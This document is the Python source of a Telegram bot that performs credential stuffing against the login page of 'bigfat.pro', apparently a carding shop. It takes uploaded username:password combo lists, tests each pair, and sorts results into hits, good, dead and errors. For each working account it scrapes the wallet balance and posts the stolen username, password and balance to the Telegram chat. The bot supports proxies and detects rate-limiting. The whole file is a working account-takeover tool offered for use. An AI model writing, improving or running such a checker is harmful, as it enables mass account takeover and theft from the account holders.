import telebot
import os
import requests
from telebot import types

# Your bot's API key from Telegram
api = 'YOUR_TELEGRAM_API_KEY'
bot = telebot.TeleBot(api)

class BigfatCCShop:
    def __init__(self, user, password, proxies=None):
        self.session = requests.Session()
        self.base_url = "https://bigfat.pro"
        self.user = user
        self.password = password
        self.proxies = proxies

    def login(self):
        login_url = f"{self.base_url}"
        data = {
            'email': self.user,
            'password': self.password,
            'phpsid_update': '1'
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        response = self.session.post(login_url, data=data, headers=headers, proxies=self.proxies)

        if "https://bigfat.pro/cart" in response.text:
            return "hit", response.text  # Returning status and response text for Status
        elif "No match for Nickname and/or Password." in response.text:
            return "dead", response.text
        elif any(ban_key in response.text for ban_key in ["try again", "You are being rate limited", "1015"]):
            return "error", response.text
        else:
            return "good", response.text

    def get_wallet_balance(self):
        wallet_url = f"{self.base_url}/transactions"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        response = self.session.get(wallet_url, headers=headers, proxies=self.proxies)
        
        balance_start = response.text.find('<span class="bf-money-amount" data-balance_value="') + len('<span class="bf-money-amount" data-balance_value="')
        balance_end = response.text.find('">', balance_start)
        balance = response.text[balance_start:balance_end] if balance_start != -1 and balance_end != -1 else None

        return balance if balance else "0"

    def logout(self):
        logout_url = f"{self.base_url}/logout"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        response = self.session.get(logout_url, headers=headers, proxies=self.proxies)

        # Return logout status message for Status2
        if response.status_code == 200:
            return "[SUCCESS] Logged out successfully"
        else:
            return "[ERROR] Failed to log out"

# Function to send messages in chunks
def send_message_chunked(chat_id, message_text):
    max_message_length = 4000  # Safe limit for message size
    if len(message_text) <= max_message_length:
        bot.send_message(chat_id, message_text)
    else:
        # Split the message into chunks
        for i in range(0, len(message_text), max_message_length):
            bot.send_message(chat_id, message_text[i:i + max_message_length])

# Function to update inline keyboard in real-time
def update_keyboard(chat_id, total, hits, good, dead, errors, message_id):
    markup = types.InlineKeyboardMarkup()
    total_button = types.InlineKeyboardButton(f"Total: {total}", callback_data='total')
    hit_button = types.InlineKeyboardButton(f"Hits: {hits}", callback_data='hit')
    good_button = types.InlineKeyboardButton(f"Good: {good}", callback_data='good')
    dead_button = types.InlineKeyboardButton(f"Dead: {dead}", callback_data='dead')
    error_button = types.InlineKeyboardButton(f"Errors: {errors}", callback_data='error')
    markup.add(total_button, hit_button, good_button, dead_button, error_button)

    bot.edit_message_reply_markup(chat_id, message_id, reply_markup=markup)

# Function to process the file and categorize the accounts, updating in real-time
def process_file(file_path, chat_id, message_id):
    total = hits = good = dead = errors = 0

    with open(file_path, 'r') as file:
        for line in file:
            total += 1
            username, password = line.strip().split(":")
            account = BigfatCCShop(username, password)
            status, login_response = account.login()  # Capturing the login response for Status

            if status == "hit":
                hits += 1
                balance = account.get_wallet_balance()
                logout_status = account.logout()  # Capturing the logout response for Status2
                # Prepare and send the message in chunks
                message_text = f"User » {username}\nPass » {password}\nStatus » {login_response}\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                send_message_chunked(chat_id, message_text)
            elif status == "good":
                good += 1
                balance = account.get_wallet_balance()
                logout_status = account.logout()  # Capturing the logout response for Status2
                # Prepare and send the message in chunks
                message_text = f"User » {username}\nPass » {password}\nStatus » {login_response}\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                send_message_chunked(chat_id, message_text)
            elif status == "dead":
                dead += 1
            elif status == "error":
                errors += 1

            update_keyboard(chat_id, total, hits, good, dead, errors, message_id)

# Start Command Handler
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please upload a file containing username:password combinations to start checking.")

# File Handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        file_path = os.path.join(os.getcwd(), message.document.file_name)
        with open(file_path, 'wb') as file:
            file.write(downloaded_file)

        bot.send_message(message.chat.id, "File received. Checking started...")
        markup = types.InlineKeyboardMarkup()
        total_button = types.InlineKeyboardButton("Total: 0", callback_data='total')
        hit_button = types.InlineKeyboardButton("Hits: 0", callback_data='hit')
        good_button = types.InlineKeyboardButton("Good: 0", callback_data='good')
        dead_button = types.InlineKeyboardButton("Dead: 0", callback_data='dead')
        error_button = types.InlineKeyboardButton("Errors: 0", callback_data='error')
        markup.add(total_button, hit_button, good_button, dead_button, error_button)

        msg = bot.send_message(message.chat.id, "Your Combos Checking Started", reply_markup=markup)
        process_file(file_path, message.chat.id, msg.message_id)

    except Exception as e:
        bot.reply_to(message, f"Error occurred: {str(e)}")

# Callback query handler for buttons
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.data == 'total':
        bot.answer_callback_query(call.id, "Total combos processed.")
    elif call.data == 'hit':
        bot.answer_callback_query(call.id, "Hit accounts show a balance.")
    elif call.data == 'good':
        bot.answer_callback_query(call.id, "Good accounts show no balance.")
    elif call.data == 'dead':
        bot.answer_callback_query(call.id, "Dead accounts could not log in.")
    elif call.data == 'error':
        bot.answer_callback_query(call.id, "Error occurred while processing some accounts.")

# Run the bot
bot.polling()
